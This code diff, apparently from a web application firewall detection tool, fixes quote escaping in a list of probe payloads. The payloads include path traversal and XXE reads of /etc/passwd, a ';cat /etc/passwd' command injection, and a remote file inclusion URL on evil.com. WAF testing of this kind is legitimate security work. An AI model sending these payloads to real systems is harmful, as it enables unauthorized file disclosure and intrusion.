@@ -250,7 +250,7 @@ class WAFDetector:
             ("lfi", "../../../etc/passwd"),
             ("rfi", "http://evil.com/shell.txt"),
             ("cmd", ";cat /etc/passwd"),
-            ("xxe", "<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>")
+            ("xxe", "<!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")
         ]
         
         for test_type, payload in test_payloads:
